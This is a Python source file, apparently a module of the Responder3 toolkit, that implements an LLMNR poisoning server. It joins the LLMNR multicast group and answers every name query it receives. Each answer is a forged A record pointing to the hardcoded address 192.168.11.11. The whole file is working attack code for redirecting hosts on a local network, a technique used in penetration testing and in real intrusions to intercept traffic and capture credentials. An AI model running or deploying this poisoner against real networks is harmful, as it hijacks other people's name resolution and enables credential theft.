import io
import logging
import traceback
import socket
import struct
import enum
import traceback
import ipaddress

from responder3.newpackets.LLMNR import * 
from responder3.newpackets.DNS import * 
from responder3.servers.BASE import ResponderServer, ResponderProtocolUDP

class LLMNR(ResponderServer):
	def __init__(self):
		ResponderServer.__init__(self)

	def modulename(self):
		return 'LLMNR'

	def run(self):
		#need to do some wizardy with the socket setting here
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
		sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
		sock.bind(('', self.bind_port))
		mreq = struct.pack("=4sl", self.bind_addr.packed, socket.INADDR_ANY)
		sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

		coro = self.loop.create_datagram_endpoint(
							protocol_factory=lambda: LLMNRProtocol(self),
							sock = sock
		)

		return self.loop.run_until_complete(coro)

	def handle(self, packet, addr, transport):
		try:
			#self.log(logging.DEBUG,'Handle called with data: ' + data.hex())
			print(repr(packet))
			pp = self.poison(packet, ipaddress.ip_address('192.168.11.11'))
			transport.sendto(pp.toBytes(), addr)
			self.log(logging.DEBUG,'Sending response!')
			

		except Exception as e:
			traceback.print_exc()
			self.log(logging.INFO,'Exception! %s' % (str(e),))
			pass

	
	def poison(self, requestPacket, poisonAddr, poisonName = None):
		self.log(logging.DEBUG,'Poisoning!')
		res = DNSResource()
		res.construct(requestPacket.Questions[0].QNAME, DNSType.A, poisonAddr)
		pp = LLMNRPacket()

		pp.construct(TID = requestPacket.TransactionID, 
					 response = LLMNRResponse.RESPONSE, 
					 answers = [res],
					 questions = requestPacket.Questions)

		return pp
		


class LLMNRProtocol(ResponderProtocolUDP):
	
	def __init__(self, server):
		ResponderProtocolUDP.__init__(self, server)

	def _parsebuff(self, addr):
		print(self._buffer)
		packet = LLMNRPacket(io.BytesIO(self._buffer))
		self._server.handle(packet, addr, self._transport)